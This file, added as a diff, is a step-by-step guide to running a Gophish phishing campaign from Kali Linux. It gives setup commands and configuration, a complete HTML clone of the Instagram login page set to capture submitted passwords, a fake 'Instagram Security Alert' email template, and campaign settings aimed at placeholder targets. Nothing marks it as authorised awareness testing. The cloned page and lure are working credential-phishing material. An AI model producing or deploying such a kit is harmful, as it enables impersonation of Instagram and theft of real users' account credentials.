@@ -1,0 +1,380 @@
+
+Create Gmail account and Turn on 2mfa
+*******************************************************************
+RUN KALI LINUX
+CHANGE NETWORK ADAPTER TO Bridge 
+MAKE SURE THE BRIDGE IS SET TO WIFI not AUTOMATIC
+
+Secure CRT the IP ADDRESS
+
+*******************************************************************
+
+# Update system and install packages
+sudo apt update -y
+sudo apt upgrade -y
+sudo apt install -y wget unzip
+
+*******************************************************************
+
+# Download, unzip, and set permissions for Gophish
+
+GO TO : https://github.com/gophish/gophish/releases
+DOWNLOAD THE LATEST GOPHISH ( gophish-v0.12.1-linux-64bit.zip )
+
+unzip gophish-v0.12.1-linux-64bit.zip
+chmod +x gophish
+
+*******************************************************************
+
+# Configure Gophish Change the IP address
+nano config.json
+
+"admin_server": {
+    "listen_url": "192.168.1.0:3333",
+    "use_tls": true,
+    "cert_path": "gophish_admin.crt",
+    "key_path": "gophish_admin.key"
+},
+"phish_server": {
+    "listen_url": "192.168.1.0:80",
+    "use_tls": false,
+    "cert_path": "example.crt",
+    "key_path": "example.key"
+}
+
+*******************************************************************
+
+# Configure firewall
+sudo apt install -y ufw
+sudo ufw enable
+sudo ufw allow 3333/tcp
+sudo ufw allow 80/tcp
+sudo ufw allow 443/tcp
+sudo ufw reload
+sudo ufw status
+
+*******************************************************************
+
+# Run Gophish
+sudo ./gophish
+
+
+# OPEN BROWSER 
+https://192.168.108.0:3333
+admin
+and the password is in the Linux
+CHANE PASSWORD
+
+*******************************************************************
+
+# CONFIGURE REPORTING SETTINGS ( IMAP )
+
+Account Settings --> Reporting Settings
+
+Monitor an IMAP account for emails reported by users.
+
+Enable Email Account Monitoring
+
+IMAP Host: imap.gmail.com
+
+IMAP Port: 993
+
+IMAP Username: YOUR GMAIL ACCOUNT
+
+IMAP Password: USE THE APP PASSWORD OF GMAIL (GOOGLE)
+
+Use TLS: Check
+
+*******************************************************************
+
+# CREATE SENDING PROFILES
+
+Name: SMTP
+
+Interface Type: SMTP
+
+SMTP From: YOUR GMAIL ACCOUNT
+
+Host: smtp.gmail.com:587
+
+Username: YOUR GMAIL ACCOUNT
+
+Password: USE THE APP PASSWORD OF GMAIL (GOOGLE)
+
+*******************************************************************
+
+# CREATE LANDING PAGE
+
+# name: Instagram
+
+HTML:
+
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+        .login-box {
+            width: 100%;
+            max-width: 360px;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-box img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .login-box h2 {
+            margin-bottom: 20px;
+            color: #262626;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .login-button:hover {
+            background-color: #2a77d1;
+        }
+        .forgot-password {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            color: #3897f0;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #999;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo"/>
+            <h2>Log into Instagram</h2>
+            <form action="" method="post">
+                <div class="input-group">
+                    <label for="email">Phone, username, or email:</label>
+                    <input type="text" id="email" name="email" required=""/>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" required=""/>
+                </div>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <div class="footer">
+                <p>Don&#39;t have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+
+
+</body></html>
+
+
+# CHECK:
+Capture Submitted Data
+Capture Passwords
+
+# Redirect to:
+https://instagram.com
+
+*******************************************************************
+
+# CREATE EMAIL TEMPLATES
+
+EMAIL TEMPLATES
+
+# Name: Email 1
+# Envelope Sender: YOUR GMAIL ACCOUNT
+# Subject: Instagram Security Alert
+
+HTML:
+
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Instagram Security Alert</title>
+	<style type="text/css">body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+        .email-content {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            margin: auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 1px solid #e2e2e2;
+        }
+        .header img {
+            width: 150px;
+            height: auto;
+        }
+        .body {
+            padding: 20px;
+        }
+        .body p {
+            margin: 0 0 15px;
+            color: #333;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .code {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            display: block;
+            margin: 20px 0;
+            text-align: center;
+            background: #f4f4f4;
+            padding: 15px;
+            border-radius: 6px;
+        }
+        .button {
+            display: inline-block;
+            padding: 12px 20px;
+            font-size: 16px;
+            color: #ffffff;
+            background-color: #3897f0;
+            text-decoration: none;
+            border-radius: 6px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .button:hover {
+            background-color: #2a77d1;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #777;
+            border-top: 1px solid #e2e2e2;
+        }
+        .footer a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+	</style>
+</head>
+<body>
+<div class="container">
+<div class="email-content">
+<div class="header"><img alt="Instagram Logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" /></div>
+
+<div class="body">
+<p>Hi {{.FirstName}},</p>
+
+<p>We noticed a login to your Instagram account from a new device or location. If this was you, please use the code below to verify this activity:</p>
+
+<p class="code">123456</p>
+
+<p>If you did not attempt this login, please <a class="button" href="{{.URL}}" rel="noopener" target="_blank">secure your account</a> by changing your password immediately.</p>
+
+<p>If you need further assistance, visit our <a href="https://help.instagram.com" rel="noopener" target="_blank">Help Center</a>.</p>
+</div>
+
+<div class="footer">
+<p>&copy; 2024 Instagram, Inc. 1601 Willow Road, Menlo Park, CA 94025</p>
+
+<p>This email was sent to <a href="mailto:{{.Email}}">{{.Email}}</a>. If you did not request this, please disregard this email. <a href="#">Unsubscribe</a></p>
+</div>
+</div>
+</div>
+</body>
+</html>
+
+
+*******************************************************************
+
+# CREATE USERS AND GROUP
+
+name: USERS
+First name: TARGET NAME
+Last name: TARGET LASTNAME
+Email: TARGET EMAIL
+Position: IT
+
+*******************************************************************
+
+# DEPLOY CAMPAIGNS
+
+CAMPAIGNS
+
+Name: Camp2
+Email Template: Email 1
+Landing Page: Insta
+URL: http://192.168.1.0 ( IP ADD OF YOUR KALI LINUX )
+Sending Profile: Instagram
+Groups: USERS
+
+
